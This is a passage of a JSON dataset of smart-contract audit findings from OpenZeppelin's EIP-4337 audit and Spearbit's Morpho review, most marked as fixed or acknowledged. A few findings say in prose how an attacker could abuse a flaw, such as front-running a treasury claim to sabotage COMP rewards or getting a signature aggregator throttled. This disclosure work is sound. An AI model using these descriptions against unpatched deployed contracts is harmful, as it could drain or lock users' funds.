      "content": "Several docstrings and inline comments throughout the code base were found to be incorrect or misleading. In particular:\n\n\n* In`BaseAccount.sol`:\n\t+ [Line 72](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BaseAccount.sol#L72): The docstring defines`sigTimeRange`as signature and time-range for this operation, but it contains the signature validity, not the signature itself.\n* In`BLSSignatureAggregator.sol`:\n\t+ [Line 117](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L117): The docstring references a call to`simulateUserOperation`. The function name should be`simulateValidation`.\n* In`EIP4337Manager.sol`:\n\t+ [Line 21](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol#L21): The docstring states the contract inherits`GnosisSafeStorage`, but it actually inherits`GnosisSafe`.\n* In`EntryPoint.sol`:\n\t+ [Line 180](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L180): The comment does not include[`paymasterAndData`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/UserOperation.sol#L30)as one of the dynamic byte arrays being excluded from`MemoryUserOp`.\n\t+ [Line 393](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L393): The docstring states that`_validatePaymasterPrepayment`validates that the paymaster is staked, but the function does not perform this check.\n* In`IPaymaster.sol`:\n\t+ [Lines 25-26](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IPaymaster.sol#L25-L26): The docstring states that the`validUntil`and`validAfter`timestamps are 4 bytes in length, but these are 8-byte (uint64) values.\n* In`IStakeManager.sol`:\n\t+ [Line 7](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L7),[lines 43-44](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L43-L44): Docstrings in this contract refer to staking only for paymasters, implying this is the only entity that should stake. Signature aggregators and factories are also required to stake following the same rules as paymasters.\n\t+ [Line 45](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L45): The docstring makes a reference to the global unstakeDelaySec, which no longer exists.\n\t+ [Line 47](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L47): The`DepositInfo`docstring explains that the variable sizes were chosen so that`deposit`and`staked`fit into a single`uint256`word, but the 3rd parameter`stake`will also fit.\n* In`SimpleAccount.sol`:\n\t+ [Line 52](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L52): The comment makes a reference to the`execFromEntryPoint`function, which no longer exists.\n\t+ [Line 57](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L57): The docstring for`execute`says called directly from owner, not by entryPoint, but the[`_requireFromEntryPointOrOwner`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L60)function allows`execute`to be called by the EntryPoint. The comment isnt clear on whether it is a suggestion, or a restriction to be enforced.\n\t+ [Lines 75-79](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L75-L79): The docstring does not match the`initialize`function.\n\t+ [Lines 89-96](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L89-L96): The docstring does not match the`_requireFromEntryPointOrOwner`function.\n* In`IEntryPoint.sol`:\n\t+ [Line 26](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IEntryPoint.sol#L26): The`@success`parameter is listed in the wrong order.\n* In`UserOperation.sol`:\n\t+ [Line 25](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/UserOperation.sol#L25): The`callGasLimit`parameter has no`@param`statement.\n\n\n***Update:**Resolved in[pull request #194](https://github.com/eth-infinitism/account-abstraction/pull/194)and[pull request #216](https://github.com/eth-infinitism/account-abstraction/pull/216), which were merged at commits[`faf305e`](https://github.com/eth-infinitism/account-abstraction/commit/faf305e3022ac7daa7cafb141ffe1dc1f936ee6c)and[`1f505c5`](https://github.com/eth-infinitism/account-abstraction/commit/1f505c5889b04a115b1bf09386c0b84cecdad5c4)respectively.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10340",
      "title": "Imprecise time range [core]",
      "impact": "LOW",
      "content": "The`EntryPoint`contract[decrements the operation expiry timestamp](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L460)in order to convert`0`(which should be interpreted as no expiry) to the maximum`uint64`value. However, every other possible expiry value is now off by one. In the interest of predictability, consider only modifying the`0`timestamp.\n\n\n***Update:**Resolved in[pull request #193](https://github.com/eth-infinitism/account-abstraction/pull/193)and merged at commit[`973c0ac`](https://github.com/eth-infinitism/account-abstraction/commit/973c0ac1e54b2f5209e1c3ba2df8585ae27a7fa5).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10339",
      "title": "Gnosis safe reverts on signature failure [samples]",
      "impact": "LOW",
      "content": "The[documentation](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L32-L33)for the`SIG_VALIDATION_FAILED`constant states that`validateUserOp`must return this value instead of reverting if signature validation fails. The`SimpleAccount`contract[correctly follows](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L110-L111)the specification, however in the`EIP4337Manager`contract, the`validateUserOp`function[reverts](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol#L45)if the signature validation fails. This means the[`simulateValidation`function](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L273)will revert without providing a`ValidationResult`object.\n\n\nConsider changing the logic so that`validateUserOp`returns`SIG_VALIDATION_FAILED`in all cases where an invalid signature is encountered.\n\n\n***Update:**Resolved in[pull request #181](https://github.com/eth-infinitism/account-abstraction/pull/181)and merged at commit[`1dfb173`](https://github.com/eth-infinitism/account-abstraction/commit/1dfb17366fb85598aadc8f4a5cb111d4ae159f26).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10338",
      "title": "Accounts cannot replaceEntryPoint[samples]",
      "impact": "LOW",
      "content": "The[comments](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L76-L78)describing the`initialize`function of the`SimpleAccount`contract claim there should be a mechanism to replace the`EntryPoint`contract. This does not match the behavior of the function it describes, and in fact, there is no mechanism to replace the`EntryPoint`contract without upgrading the whole account.\n\n\nConsider updating the comment to match the behavior, and introducing a mechanism to replace the`EntryPoint`contract if that functionality is desired.\n\n\n***Update:**Resolved in[pull request #192](https://github.com/eth-infinitism/account-abstraction/pull/192)and merged at commit[`82685b2`](https://github.com/eth-infinitism/account-abstraction/commit/82685b233feaad7b63f2744137855e939f1146b6). A @dev comment was added to the docstring of the`initialize`function to clarify that the`_entryPoint`storage variable is not a parameter of the initializer because an upgrade is required to change the EntryPoint address.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10337",
      "title": "Invalid aggregate signature [samples]",
      "impact": "HIGH",
      "content": "The`BLSSignatureAggregator`exposes a mechanism to let the bundler[validate individual signatures](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L123)before constructing the bundle. Successful operations are grouped so the bundler can[combine their signatures](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L143)off-chain and the`EntryPoint`can[validate them together](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L142)on-chain. However, it is possible for an account to construct an operation that will pass the individual-signature check and still fail the combined-signature check.\n\n\nIn particular, if the public key it exposes[during the individual validation](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L126)is different from the one used[during the combined validation](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L60), the two validations will be inconsistent even though the signature is the same. This could occur if the[last 4 words of the`initCode`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L23)do not match the public key (because the`initCode`has additional data, or if they do not use the[expected creation function](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccountFactory.sol#L29)). It could also occur if the[users validation function](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L135)(which is not invoked during the individual signature validation) changes the public key that is returned by`getBlsPublicKey`.\n\n\nIf a bundler constructs a bundle with these operations, it will be unable to validate the combined signature and will attribute the fault to the aggregator, which will cause the aggregator to be throttled and user operations with the same aggregator will not be processed.\n\n\nConsider synchronizing the two validation functions so they both use the same public key.\n\n\n***Update:**Resolved in[pull request #195](https://github.com/eth-infinitism/account-abstraction/pull/195)as well as commit[`268f103`](https://github.com/eth-infinitism/account-abstraction/pull/216/commits/268f103597c0406ba2595cf18d3d5a5473b9c7b9)of[pull request #216](https://github.com/eth-infinitism/account-abstraction/pull/216), which were merged at commits[`1cc1c97`](https://github.com/eth-infinitism/account-abstraction/commit/1cc1c97a00131a7922d1ccebd823e81e823b5d9f)and[`1f505c5`](https://github.com/eth-infinitism/account-abstraction/commit/1f505c5889b04a115b1bf09386c0b84cecdad5c4)respectively.*",
      "summary": "\nThis bug report is about the BLSSignatureAggregator component of the account-abstraction repository. This component is used to validate individual signatures before constructing a bundle, and to combine them off-chain and validate them together on-chain. The bug is that it is possible for an account to construct an operation that will pass the individual-signature check but fail the combined-signature check. This occurs if the public key used during individual validation is different from the one used during combined validation. This can be caused by the last 4 words of the initCode not matching the public key, or if they do not use the expected creation function, or if the users validation function changes the public key. If a bundler constructs a bundle with these operations, it will be unable to validate the combined signature and will attribute the fault to the aggregator, causing the aggregator to be throttled. The bug was resolved in pull request #195 and commit #268f103 of pull request #216, which were merged at commits #1cc1c97 and #1f505c5, respectively.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "6918",
      "title": "When adding a new rewards manager, users already on the pool won't be earning rewards",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- aave-v2/MatchingEngine.sol#L315\n- compound/MatchingEngine.sol#L347\n\n## Description\nWhen setting a new rewards manager, existing users that are already on the pool are not tracked and won't be earning rewards.\n\n## Recommendation\nThere's currently no efficient way to fix this besides initializing the new reward manager with all users who are already on the pool. Users with large pool supplies can resupply/reborrow a tiny amount to the pool to be registered in the new rewards manager.\n\n## Morpho\nIt was like this when Aave still had rewards. We have removed it for Aave in PR 1545 and PR 1538. For Compound, we acknowledge this issue. Users will be warned in any case before a rewards manager is set to 0.\n\n## Spearbit\nVerified the Aave rewards removal and acknowledged the approach for Compound.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6917",
      "title": "Delta leads to incorrect reward distributions",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity\n**Low Risk**\n\n## Context\n**File:** aave-v2/File.sol  \n**Line:** 123\n\n## Description\nDelta describes the amount that is on the pool but is still wrongly tracked as inP2P for some users. There are users that do not have their P2P balance updated to an equivalent pool balance and, therefore, do not earn rewards. There is now a mismatch of this delta between the pool balance that earns a reward and the sum of pool balances that are tracked in the reward manager to earn that reward. The increase in delta directly leads to an increase in rewards for all other users on the pool.\n\n## Recommendation\nIn a future version, think about distributing the share of the delta on the balance that earns rewards (delta / (onPool + delta)) to all P2P suppliers.\n\n## Morpho\nThese are quite involved and difficult tasks that would require a lot of changes. For these reasons, we decided not to implement the recommendation.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6916",
      "title": "Heap only supports balances up to type(uint96).max",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n**Context**: `HeapOrdering.sol#L9`\n\n**Description**: The current heap implementation packs an address and the balance into a single storage slot which restricts the balance to the `uint96` type with a max value of ~7.9e28. If a token has 18 decimals, the largest balance that can be stored will be 7.9e10. This could lead to problems with a token of low value, for example, if...",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6915",
      "title": "HeapOrdering.getNext returns the root node for nodes not in the list",
      "impact": "LOW",
      "content": "## Security Audit Report\n\n## Severity\n**Low Risk**\n\n## Context\n`HeapOrdering.sol#L328`\n\n## Description\nIf an id does not exist in the `HeapOrdering`, the `getNext()` function will return the root node:\n\n```solidity\nuint256 rank = _heap.ranks[_id]; // @audit returns 0 as rank. rank + 1 will be the root\nif (rank < _heap.accounts.length) return getAccount(_heap, rank + 1).id;\nelse return address(0);\n```\n\n## Recommendation\nConsider returning the zero address if the rank variable is zero (the `_id` was not found).\n\n## Morpho\nThis issue has been fixed in PR 107 and PR 1627.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6914",
      "title": "Compound liquidity computation uses outdated cached borrowIndex",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n`compound/MorphoUtils.sol#L211`\n\n## Description\nThe `_isLiquidatable` function iterates over all user-entered markets and calls `_getUserLiquidityDataForAsset(poolToken)` followed by `_getUserBorrowBalanceInOf(poolToken)`. However, it only updates the indexes of markets that correspond to the borrow and collateral assets. The `_getUserBorrowBalanceInOf` function computes the underlying pool amount of the user as:\n\n```\nuserBorrowBalance.onPool.mul(lastPoolIndexes[_poolToken].lastBorrowPoolIndex);\n```\n\nNote that `lastPoolIndexes[_poolToken].lastBorrowPoolIndex` is a value that was cached by Morpho and it can be outdated if there has not been a user interaction with that market for a long time.\n\nThe liquidation does not match Compound's liquidation anymore, and users might not be liquidated on Morpho that could be liquidated on Compound. Liquidators would first need to trigger updates to Morpho's internal borrow indexes.\n\n## Recommendation\nTo match Compound's liquidation procedure, consider using Compound's `borrowIndex`, which might have been updated after Morpho updated its own internal indexes.\n\n### Function Code\n```solidity\nfunction _getUserBorrowBalanceInOf(address _poolToken, address _user)\n    internal\n    view\n    returns (uint256)\n{\n    Types.BorrowBalance memory userBorrowBalance = borrowBalanceInOf[_poolToken][_user];\n    return\n        userBorrowBalance.inP2P.mul(p2pBorrowIndex[_poolToken]) +\n        userBorrowBalance.onPool.mul(lastPoolIndexes[_poolToken].lastBorrowPoolIndex);\n    // Changed to:\n    // userBorrowBalance.onPool.mul(ICToken(_poolToken).borrowIndex());\n}\n```\n\n## Morpho\nFixed in PR 1558.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report concerns MorphoUtils.sol#L211 in the Compound/MorphoUtils codebase. The issue is that the _isLiquidatable function iterates over all user-entered markets and calls _getUserLiquidity-DataForAsset(poolToken), but only updates the indexes of markets that correspond to the borrow and collateral assets. This means that Morpho's liquidation procedure may not match Compound's liquidation procedure, and users may not be liquidated on Morpho that could be liquidated on Compound. \n\nThe recommendation to fix this issue is to consider using Compound's borrowIndex, which may have been updated after Morpho updated its internal indexes. This would match Compound's liquidation procedure. The fix was implemented in PR 1558 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6913",
      "title": "claimToTreasury(COMP) steals users' COMP rewards",
      "impact": "MEDIUM",
      "content": "## Security Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`compound/MorphoGovernance.sol#L414`\n\n## Description\nThe `claimToTreasury` function can send a market's underlying tokens that have been accumulated in the contract to the treasury. This is intended to be used for the reserve amounts that accumulate in the contract from P2P matches. However, Compound also pays out rewards in COMP, and COMP is a valid Compound market. \n\nSending the COMP reserves will also send the COMP rewards. This is especially concerning as anyone can claim COMP rewards on behalf of Morpho at any time, and the rewards will be sent to the contract. An attacker could even frontrun a `claimToTreasury(cCOMP)` call with a `Comptroller.claimComp(morpho, [cComp])` call to sabotage the reward system, resulting in users being unable to claim their rewards.\n\n## Recommendation\nIf Morpho wants to support the COMP market, consider separating the COMP reserve from the COMP rewards.\n\n## Morpho Response\nGiven the changes required and the small likelihood of setting a reserve factor for the COMP asset, and our awareness of this issue, we have decided not to implement it.\n\n## Spearbit Response\nAcknowledged.",
      "summary": "\nThis bug report is about the claimToTreasury function in the MorphoGovernance.sol#L414 contract. This function sends a market's underlying tokens that have been accumulated in the contract to the treasury. This is intended to be used for the reserve amounts that accumulate in the contract from P2P matches. However, Compound also pays out rewards in COMP and COMP is a valid Compound market. Sending the COMP reserves will also send the COMP rewards, which is bad because anyone can claim COMP rewards on the behalf of Morpho at any time and the rewards will be sent to the contract. An attacker could even frontrun a claimToTreasury(cCOMP) call with a Comptroller.claimComp(morpho, [cComp]) call to sabotage the reward system.\n\nThe recommendation is that if Morpho wants to support the COMP market, they should consider separating the COMP reserve from the COMP rewards. Morpho decided not to implement this due to the changes to do and the small likelihood to set a reserve factor for the COMP asset and the awareness on their side about this. Spearbit acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Deposit/Reward tokens",
        "Business Logic"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6912",
      "title": "Turning off an asset as collateral on Morpho-Aave still allows seizing of that collateral on Morpho and leads to liquidations",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- [MorphoGovernance.sol#L407](https://github.com/aave-v2/MorphoGovernance.sol#L407)\n- [MorphoUtils.sol#L285](https://github.com/aave-v2/MorphoUtils.sol#L285)\n\n## Description\nThe Morpho Aave deployment can set the asset to not be used as collateral for Aave's Morpho contract position. On Aave, this prevents liquidators from seizing this asset as collateral.\n\n1. However, this prevention does not extend to users on Morpho as Morpho has not implemented this check. Liquidations are performed through a repay & withdraw combination, and withdrawing the asset on Aave is still allowed.\n2. When turning off the asset as collateral, the single Morpho contract position on Aave might still be over-collateralized, but some users on Morpho suddenly lose this asset as collateral (LTV becomes 0) and will be liquidated.\n\n## Recommendation\nThe feature does not work well with the current version of the Morpho Aave contracts. It must be enabled right from the beginning and may not be set later when users are already borrowing against the asset as collateral on Morpho. Clarify when this feature is supposed to be used, taking into consideration the mentioned issues. Reconsider if it's required.\n\n**Morpho:** Fixed in PR 1542.  \n**Spearbit:** Verified.",
      "summary": "\nThis bug report is about the Morpho Aave deployment. The issue is that the feature to prevent liquidators from seizing an asset as collateral does not extend to users on Morpho. This means that when the asset is turned off as collateral, users on Morpho suddenly lose this asset as collateral and will be liquidated. The recommendation is to clarify when this feature is supposed to be used, taking into consideration the mentioned issues. It is also recommended to reconsider if the feature is required. The bug has been fixed in PR 1542 and verified.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6911",
      "title": "In Compound implementation, P2P indexes can be stale",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `MorphoUtils.sol`#L119-L156\n- `PositionsManager.sol`#L344\n- `PositionsManager.sol`#L447\n- `PositionsManager.sol`#L502-L505\n\n## Description\nThe current implementation of `MorphoUtils._isLiquidatable` loops through all of the tokens in which the user has supplied to/borrowed from. The scope of the function is to check whether the user can be liquidated or not by verifying that `debtValue > maxDebtValue`.\n\nResolving \"Compound liquidity computation uses outdated cached borrowIndex\" implies that the Compound borrow index used is always up-to-date but the P2P issues associated with the token could still be out of date if the market has not been used recently, and the underlying Compound indexes (on which the P2P index is based) have changed a lot.\n\nAs a consequence, all the functions that rely on `_isLiquidatable` (`liquidate`, `withdraw`, `borrow`) could return a wrong result if the majority of the user's balance is on the P2P balance (the problem is even more aggravated without resolving \"Compound liquidity computation uses outdated cached borrowIndex\").\n\nLet's say, for example:\n- Alice supplies ETH in the pool\n- Alice supplies BAT in P2P\n- Alice borrows some DAI\n\nAt some point in time the ETH value goes down, but the interest rate of BAT goes up. If the P2P index of BAT had been correctly up-to-date, Alice would have been still solvent, but she gets liquidated by Bob who calls `liquidate(alice, ETH, DAI)`.\n\nEven by fixing \"Compound liquidity computation uses outdated cached borrowIndex,\" Alice would still be liquidated because her entire collateral is on P2P and not in the pool.\n\n## Recommendation\nConsider following the same approach implemented in the Morpho-Aave implementation inside `MorphoUtils._liquidityData` that will always be the token that the user has supplied/borrowed. Unlike Aave, Morpho's Compound implementation does not have a maximum hard-cap limit, which means that the `_isLiquidatable` loop could possibly revert because of an Out of Gas exception.\n\nUltimately, Morpho should always remember to call `updateP2PIndexes` (for both Aave and Compound) before any logic inside the `*PositionsManager` (both Aave and Compound).\n\n### Morpho\nBecause liquidators are updating indexed to be able to perform liquidations and because it would drastically increase the gas cost, we decided not to implement this recommendation.\n\n### Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the MorphoUtils._isLiquidatable function which checks if a user can be liquidated or not by verifying that debtValue is greater than maxDebtValue. The problem is that the function loops through all of the tokens that the user has supplied to/borrowed from and this could lead to incorrect results if the majority of the user's balance is on the P2P balance. To solve this problem, the same approach implemented in the Morpho-Aave implementation should be followed. This approach would always remember to call updateP2PIndexes before any logic inside the *PositionsManager. However, Morpho decided not to implement this recommendation due to the increased gas cost it would bring.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6910",
      "title": "Supplying and borrowing can recreate p2p credit lines even if p2p is disabled",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n**Context:** \n- aave-v2/EntryPositionsManager.sol#L117\n- aave-v2/EntryPositionsManager.sol#L215\n- compound/PositionsManager.sol#L258\n- compound/PositionsManager.sol#L354\n\n**Description:**  \nWhen supplying/borrowing, the algorithm attempts to reduce the deltas `p2pBorrowDelta` and `p2pSupplyDelta` by moving borrowers and suppliers back to P2P. However, it does not check if P2P is enabled. This oversight has significant implications, especially when governance disables P2P and aims to redirect users and liquidity back to the pool through `increaseDelta` calls. Users could inadvertently re-enter P2P by supplying and borrowing.\n\n**Recommendation:**  \nDisable matching the initial delta-matching step in supply and borrow if P2P is disabled. This precaution is necessary only for supply and borrow operations and not for repay and withdraw. For repay and withdraw, while we are also reducing the delta, we are not creating new P2P credit lines (as `p2pAmount` also decreases, resulting in a differential of zero). This process can be viewed as unmatching our P2P balance, reducing the delta, shifting our P2P balance to the pool, and then withdrawing from the pool.\n\n**Morpho:** Fixed in PR 1453.\n\n**Spearbit:** Verified.",
      "summary": "\nThis bug report is about a problem found in the Aave-V2, Compound and PositionsManager.sol. The issue is that when supplying or borrowing, the algorithm tries to reduce the deltas (p2pBorrowDelta/p2pSupplyDelta) by moving borrowers/suppliers back to P2P, but it does not check if P2P is enabled. This can lead to users entering P2P again when governance disables P2P and wants to put users and liquidity back on the pool.\n\nThe recommendation to fix the issue is to disable the initial delta-matching step in supply and borrow if P2P is disabled. This is only necessary for supply and borrow, and not for repay and withdraw, because when repaying and withdrawing, the p2pAmount also decreases, so the diff is zero.\n\nThe issue has been fixed in PR 1453 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Bypass limit"
      ],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6909",
      "title": "Cannot liquidate Morpho users if no liquidity on the pool",
      "impact": "MEDIUM",
